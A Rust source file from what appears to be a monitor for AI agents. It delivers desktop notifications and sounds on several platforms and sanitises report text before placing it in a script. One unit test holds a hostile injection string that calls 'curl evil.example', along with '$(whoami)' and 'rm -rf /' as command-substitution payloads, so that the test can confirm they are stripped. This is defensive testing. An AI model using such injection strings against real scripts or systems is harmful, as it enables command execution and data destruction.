//! Raising a notification, and making a sound.
//!
//! The response ladder has always been able to decide `Alert`. Nothing
//! delivered it. A monitor whose capability table says it can alert, which then
//! reaches that decision and stays silent, is worse than one that never offered
//! the mode: the operator believes they are being told.
//!
//! What is delivered is deliberately small. The platform's own notification
//! centre and its own sound, no window of our own, no daemon, and nothing that
//! survives the application closing. A security tool that installs a persistent
//! agent to show a message has made itself into the thing it watches for.
//!
//! Everything here is best-effort and silent on failure. A host with
//! notifications switched off is a host that does not get them, and that is the
//! operator's decision to have made.

use std::process::Command;

/// What happened, as the notification says it.
#[derive(Debug, Clone, PartialEq, Eq)]
pub struct Alarm {
    /// The agent it is about.
    pub agent: String,
    /// The grade it reached.
    pub grade: String,
    /// The finding worth naming.
    pub finding: String,
}

impl Alarm {
    /// The line the notification centre shows.
    #[must_use]
    pub fn line(&self) -> String {
        format!("{} · {} · {}", self.grade, self.agent, self.finding)
    }
}

/// Grades worth interrupting someone for.
///
/// `LOW` and anything unscored are not. A monitor that notifies on everything
/// is a monitor whose notifications get switched off, and then it notifies on
/// nothing.
#[must_use]
pub fn worth_raising(grade: &str) -> bool {
    matches!(
        grade.to_ascii_uppercase().as_str(),
        "CRITICAL" | "HIGH" | "MEDIUM"
    )
}

/// Show one notification, and optionally make a sound.
pub fn raise(alarm: &Alarm, sound: bool) {
    notify(&alarm.line());
    if sound {
        play();
    }
}

#[cfg(target_os = "macos")]
fn notify(line: &str) {
    // Through the platform's own scripting bridge rather than a crate, so the
    // dependency set of a security tool does not grow to show a message.
    // Quotes are stripped rather than escaped: the text is a report field, and
    // building a script out of one is exactly the shape of an injection.
    let safe = sanitise(line);
    let script = format!("display notification \"{safe}\" with title \"Topgent\"");
    let _ = Command::new("osascript").arg("-e").arg(script).status();
}

#[cfg(target_os = "linux")]
fn notify(line: &str) {
    let _ = Command::new("notify-send")
        .arg("--app-name=Topgent")
        .arg("Topgent")
        .arg(sanitise(line))
        .status();
}

#[cfg(windows)]
fn notify(line: &str) {
    // `.Item(n)`, not `[n]`. The node list is a WinRT `IXmlNodeList`, which
    // PowerShell cannot index: `[1]` returns null, `AppendChild` on it throws,
    // and the toast ships with an empty second line. It looks like a working
    // notification with nothing in it, which is how it survived unnoticed.
    let safe = sanitise(line);
    let script = format!(
        "[Windows.UI.Notifications.ToastNotificationManager, Windows.UI.Notifications, \
         ContentType=WindowsRuntime] > $null; \
         $t=[Windows.UI.Notifications.ToastNotificationManager]::GetTemplateContent(\
         [Windows.UI.Notifications.ToastTemplateType]::ToastText02); \
         $n=$t.GetElementsByTagName('text'); \
         $n.Item(0).AppendChild($t.CreateTextNode('Topgent')) > $null; \
         $n.Item(1).AppendChild($t.CreateTextNode('{safe}')) > $null; \
         [Windows.UI.Notifications.ToastNotificationManager]::CreateToastNotifier('Topgent')\
         .Show([Windows.UI.Notifications.ToastNotification]::new($t))"
    );
    let mut command = Command::new("powershell");
    command.args(["-NoProfile", "-NonInteractive", "-Command", &script]);
    no_window(&mut command);
    let _ = command.status();
}

#[cfg(not(any(target_os = "macos", target_os = "linux", windows)))]
fn notify(_line: &str) {}

#[cfg(windows)]
fn no_window(command: &mut Command) {
    use std::os::windows::process::CommandExt;
    command.creation_flags(0x0800_0000);
}

#[cfg(target_os = "macos")]
fn play() {
    let _ = Command::new("afplay")
        .arg("/System/Library/Sounds/Submarine.aiff")
        .status();
}

#[cfg(target_os = "linux")]
fn play() {
    // Whichever of the two usual players is installed. Neither is required.
    for player in ["paplay", "aplay"] {
        let sound = "/usr/share/sounds/freedesktop/stereo/message.oga";
        if Command::new(player)
            .arg(sound)
            .status()
            .is_ok_and(|s| s.success())
        {
            return;
        }
    }
}

#[cfg(windows)]
fn play() {
    let mut command = Command::new("powershell");
    command.args([
        "-NoProfile",
        "-NonInteractive",
        "-Command",
        "[console]::beep(880,200)",
    ]);
    no_window(&mut command);
    let _ = command.status();
}

#[cfg(not(any(target_os = "macos", target_os = "linux", windows)))]
fn play() {}

/// Strip what a shell or a script would treat as structure.
///
/// The text comes from a report, and a report describes processes an attacker
/// may have named. Passing that into a script is how an interface that shows a
/// finding becomes the way the finding executes.
#[must_use]
fn sanitise(line: &str) -> String {
    line.chars()
        .filter(|c| {
            !matches!(
                c,
                '"' | '\'' | '\\' | '`' | '$' | '\n' | '\r' | ';' | '&' | '|'
            )
        })
        .take(180)
        .collect()
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn only_grades_worth_interrupting_someone_for_raise_one() {
        for grade in ["CRITICAL", "HIGH", "MEDIUM", "critical"] {
            assert!(worth_raising(grade), "{grade} should raise");
        }
        for grade in ["LOW", "", "unknown", "INFO"] {
            assert!(!worth_raising(grade), "{grade} should not raise");
        }
    }

    #[test]
    fn a_process_named_to_break_out_of_the_script_cannot() {
        let hostile = Alarm {
            agent: "x\"; do shell script \"curl evil.example\"; --".to_owned(),
            grade: "CRITICAL".to_owned(),
            finding: "$(whoami) `id` && rm -rf /".to_owned(),
        };
        let safe = sanitise(&hostile.line());
        for forbidden in ['"', '\'', '\\', '`', '$', ';', '&', '|'] {
            assert!(!safe.contains(forbidden), "{forbidden} survived: {safe}");
        }
    }

    #[test]
    fn a_newline_cannot_add_a_second_line_to_the_script() {
        assert!(!sanitise("one\ntwo\r\nthree").contains('\n'));
    }

    #[test]
    fn a_very_long_finding_is_cut_rather_than_passed_whole() {
        let long = "a".repeat(5000);
        assert!(sanitise(&long).chars().count() <= 180);
    }

    #[test]
    fn the_line_names_the_agent_and_the_grade_not_just_the_finding() {
        let alarm = Alarm {
            agent: "claude-code".to_owned(),
            grade: "CRITICAL".to_owned(),
            finding: "Can reach a credential".to_owned(),
        };
        let line = alarm.line();
        assert!(line.contains("claude-code"));
        assert!(line.contains("CRITICAL"));
        assert!(line.contains("credential"));
    }
}
